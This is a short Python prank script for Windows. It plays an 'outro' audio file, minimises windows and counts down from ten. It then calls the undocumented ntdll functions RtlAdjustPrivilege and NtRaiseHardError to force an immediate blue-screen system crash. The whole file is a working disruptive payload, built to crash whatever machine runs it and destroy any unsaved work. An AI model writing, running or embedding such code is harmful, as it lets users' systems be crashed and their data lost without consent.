import webbrowser
import time
import subprocess
import keyboard
import os
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
# replace with your path
webbrowser.open("outro.mp3")

time.sleep(0.25)
keyboard.press_and_release("windows + m")
keyboard.press_and_release("alt + tab")
time.sleep(0.5)
keyboard.press_and_release("f11")
for zaky in range(10):
    print("Shutting down in: " + str(10 - zaky) + " Seconds")
    time.sleep(1)
    

print("Shutting down now!")
time.sleep(0.5)
nullptr = POINTER(c_int)()

windll.ntdll.RtlAdjustPrivilege(
    c_uint(19), 
    c_uint(1), 
    c_uint(0), 
    byref(c_int())
)

windll.ntdll.NtRaiseHardError(
    c_ulong(0xC000007B), 
    c_ulong(0), 
    nullptr, 
    nullptr, 
    c_uint(6), 
    byref(c_uint())
)